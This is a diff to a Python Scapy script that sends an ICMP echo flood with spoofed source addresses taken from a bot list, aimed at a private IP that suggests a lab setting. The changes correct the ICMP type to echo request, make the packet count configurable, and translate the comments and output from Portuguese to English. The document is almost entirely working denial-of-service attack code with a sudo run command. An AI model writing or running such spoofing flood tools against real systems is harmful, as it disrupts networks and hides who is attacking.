@@ -3,9 +3,10 @@ import random
 import time
 import ipaddress
 
-# Ataque ICMP Flood, sem payload (mínimo), spoofing de IP.
+# ICMP Echo Flood
 TARGET_IP = "192.168.100.2"
-BOTFILE = "bots.txt"
+BOTFILE = "../bots.txt"
+NUM_PACKETS = 100
 
 def load_bots(filename):
     bot_ips = []
@@ -27,12 +28,12 @@ def run_icmp_flood_attack():
         source_ip = random.choice(bot_ips)
         ip_layer = IP(src=source_ip, dst=TARGET_IP)
         eth_layer = Ether()
-        icmp_layer = ICMP(type=5, code=1)  # Echo Request, sem payload
+        icmp_layer = ICMP(type=8, code=0)  # Echo Request, no payload
         packet = eth_layer / ip_layer / icmp_layer
         lista_de_pacotes.append(packet)
         numero_de_pacotes_enviados += 1
 
-        if numero_de_pacotes_enviados == 100:
+        if numero_de_pacotes_enviados == NUM_PACKETS:
             break
 
 
@@ -41,10 +42,11 @@ def run_icmp_flood_attack():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
+
 
 if __name__ == "__main__":
     run_icmp_flood_attack()
 
-# sudo PYTHONPATH=$HOME/scapy python3 simple_udp_flood.py
+# sudo PYTHONPATH=$HOME/scapy python3 icmp_flood_echo.py
